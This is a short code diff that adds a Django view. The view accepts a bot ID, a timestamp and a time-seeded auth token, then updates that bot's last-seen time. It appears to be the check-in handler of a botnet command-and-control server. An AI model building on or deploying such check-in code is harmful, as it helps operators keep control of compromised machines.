@@ -26,6 +26,17 @@ def reg(request):
     return render(request, 'index.html')
 
 
+def cmd(request):
+    params = request.POST
+    botId = params.get('botId', False)
+    t = params.get('t', False)
+    auth = params.get('auth', False)
+    if botId and t and auth == genTimeSeed():
+        bot = Bot.objects.get(botId=botId)
+        if bot:
+            bot.lastSeen = t
+            bot.save()
+    return render(request, 'index.html')
 
 
 def genTimeSeed():
